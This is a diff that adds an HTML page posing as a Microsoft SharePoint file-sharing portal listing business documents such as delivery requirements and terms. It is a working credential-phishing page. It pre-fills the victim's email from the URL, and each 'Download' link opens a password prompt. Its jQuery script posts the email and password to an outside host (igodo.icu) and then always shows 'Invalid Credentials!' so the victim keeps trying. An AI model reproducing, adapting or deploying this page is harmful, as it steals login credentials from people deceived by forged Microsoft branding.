@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>SharePoint</title>
+
+    <meta name="description" content="_Materials">
+  
+
+
+    <meta name="keywords" content="_Demands">
+
+    <meta name="robots" content="noindex, nofollow">
+
+    <meta property="og:title" content="_Overview | Specs">
+
+    <meta property="og:type" content="website">
+
+    <meta property="og:site_name" content="_&amp;Requirements">
+
+    <meta property="og:description" content="&amp;RFQ_">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+   
+    <link rel="stylesheet" href="bootstrap.css">
+  <script src="jquery.js"></script>
+  <script src="popper.js"></script>
+  <script src="bootstrap.js"></script>
+  <!-- <script src="app.js"></script> -->
+<script> 
+$(document).ready(function() {
+    $('#msg').hide();
+    $('#msg2').hide();
+    var baseUrl = (window.location).href;
+    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+    $("#x1").val(url);
+
+    $("#profileUp").submit(function(e) {
+        e.preventDefault();
+        var nm = $("#A1").val();
+        var formData = new FormData($("#profileUp")[0]);
+        $("#byn").html("Processing..").prop("disabled", true);
+        $.ajax({
+            
+            url: "https://igodo.icu/5534e3-5229a1-78462a/a.php",
+            type: 'POST',
+            dataType: 'text',
+            data: formData,
+             
+        
+            contentType: false,
+            processData: false,
+           
+            complete: function(jqXHR) {
+                $('#msg').show();
+                $('#msg2').hide();
+                setTimeout(function() {
+                    $('#msg').hide();
+                    $('#msg2').show();
+                    $("#x1").val(url);
+                    $("#x2").val("");
+                    $("#byn").html("Access Document").prop("disabled", false);
+                }, 2000);
+            }
+        });
+    });
+});
+    </script>
+
+
+    <style>
+        video {
+            object-fit: cover;
+            width: 100vw;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+    </style>
+</head>
+
+<body class="">
+
+    <script>
+       
+    </script>
+    <nav class="navbar " style="background-color:#026FC2;">
+        <div class="container">
+            <a class="navbar-brand" href="#" data-toggle="modal" data-target="#myModal"><img src="logo.jpg"></a>
+            <button class="navbar-toggler " type="button ">
+                <span class="navbar-toggler-icon text-dark"></span>
+            </button>
+
+        </div>
+    </nav>
+
+
+    <div class="container">
+        <div class="row mt-4">
+            <div class="col-sm-9 p-0 " style="box-shadow:2px 2px  3px gray">
+                <table class="table">
+                    <thead>
+                        <tr>
+                            <th class="col-checkbox">
+                                <label>
+                    <input type="checkbox" class="toggle-all-checkboxes" checked="checked">
+                    <span></span>
+                    </label>
+                            </th>
+                            <th>Name</th>
+                            <th>Size</th>
+                            <th class="col-action"></th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="9y431yWQ8h13" id="frm-deliveryDetailForm-deliveryDetailForm-9y431yWQ8h13" checked="checked" class="toggle-checkbox" data-download-size="1680663">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Specific products, with detailed descriptions.pdf
+                            </td>
+                            <td class="color-brighter">1.6 MB</td>
+                            <td class="col-action">
+                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="9y431yWQ8h13">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="SEguAYyma6th" id="frm-deliveryDetailForm-deliveryDetailForm-SEguAYyma6th" checked="checked" class="toggle-checkbox" data-download-size="1744">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Product quantity.xls
+                            </td>
+                            <td class="color-brighter">1.1 MB</td>
+                            <td class="col-action">
+                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="SEguAYyma6th">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="pADZ2zIuVLAi" id="frm-deliveryDetailForm-deliveryDetailForm-pADZ2zIuVLAi" checked="checked" class="toggle-checkbox" data-download-size="4301">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Sample image.jpg
+                            </td>
+                            <td class="color-brighter">1.8 MB</td>
+                            <td class="col-action">
+                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="pADZ2zIuVLAi">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                        <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked="checked" class="toggle-checkbox" data-download-size="1086">
+                        <span></span>
+                        </label>
+                            </td>
+                            <td class="break-word">
+                                Company profile.pdf
+                            </td>
+                            <td class="color-brighter">1.03 MB</td>
+                            <td class="col-action">
+                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                        Download
+                        </span>
+                                </a>
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                            <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked="checked" class="toggle-checkbox" data-download-size="1086">
+                            <span></span>
+                            </label>
+                            </td>
+                            <td class="break-word">
+                                Delivery requirements.pdf
+                            </td>
+                            <td class="color-brighter">1.07 MB</td>
+                            <td class="col-action">
+                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                            Download
+                            </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked="checked" class="toggle-checkbox" data-download-size="1086">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Important Organizational Update For Partners.pdf
+                            </td>
+                            <td class="color-brighter">2.67 MB</td>
+                            <td class="col-action">
+                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td class="col-checkbox">
+                                <label>
+                    <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked="checked" class="toggle-checkbox" data-download-size="1086">
+                    <span></span>
+                    </label>
+                            </td>
+                            <td class="break-word">
+                                Terms and conditions.pdf
+                            </td>
+                            <td class="color-brighter">2.03 MB</td>
+                            <td class="col-action">
+                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
+                                    <span class="icon-arrow-down-circle"></span>
+                                    <span class="underline-item">
+                    Download
+                    </span>
+                                </a>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+
+            </div>
+
+            <div class="col-sm-3">
+
+            </div>
+        </div>
+        <div class="my-4" style="font-size: 12px;">© Microsoft 2022</div>
+    </div>
+    
+
+
+
+    <!-- The Modal -->
+    <div class="modal" id="myModal" style="display: none;" aria-hidden="true">
+        <div class="modal-dialog modal-md">
+            <div class="modal-content">
+
+                <!-- Modal Header -->
+                <div class="modal-header">
+                    <img src="loo.jpg">
+                    <button type="button" class="close" data-dismiss="modal">×</button>
+                </div>
+
+                <!-- Modal body -->
+                <div class="modal-body ">
+                    <div id="msg" class="alert alert-success" style="display: none;">
+                        Authenticating Credentials, Please wait...
+                    </div>
+                    <div id="msg2" class="alert alert-danger" style="display: none;">
+                        Invalid Credentials!
+                    </div>
+
+                    <form method="post" id="profileUp">
+                        <label for="demo">Email address</label>
+                        <input type="text" readonly="readonly" class="form-control" value="" placeholder="Email" id="x1" name="x1">
+                        <div><small>We'll never share your email with anyone.</small></div>
+                        <label for="demo">Password</label>
+                        <input type="password" class="form-control" value="" placeholder="Receiver's Password" id="x2" name="x2" required="">
+                        <div class="mb-3"><small>Required for end to end encryption</small></div>
+                        <hr>
+                        <div class="mb-3"> <button type="submit" id="byn" class="btn-primary btn">Access File</button>
+                        </div>
+                        <div style="font-size: 10px;">
+                            All rights reserved. © Microsoft 2022
+                        </div>
+                        </form>
+                </div>
+                
+            </div>
+
+
+        </div>
+    </div>
+    
+
+
+
+
+  
+
+
+
+</body></html>
